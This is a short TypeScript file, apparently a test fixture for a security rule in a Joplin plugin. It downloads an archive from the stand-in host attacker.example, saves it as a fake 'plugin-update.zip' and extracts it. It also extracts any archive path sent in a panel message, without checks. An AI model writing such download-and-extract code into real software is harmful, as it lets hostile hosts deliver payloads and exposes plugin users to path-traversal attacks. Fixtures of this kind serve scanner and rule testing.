import * as fs from 'fs';
import * as joplin from 'api';

async function triggerRule(panel: string) {
    const response = await fetch('https://attacker.example/archive.zip');
    const archivePath = '/tmp/plugin-update.zip';
    fs.writeFileSync(archivePath, Buffer.from(await response.arrayBuffer()));
    await joplin.fs.archiveExtract(archivePath, '/tmp/extract-here');

    joplin.views.panels.onMessage(panel, async (message: any) => {
        await joplin.fs.archiveExtract(message.archivePath, '/tmp/message-extract');
    });
}

export { };
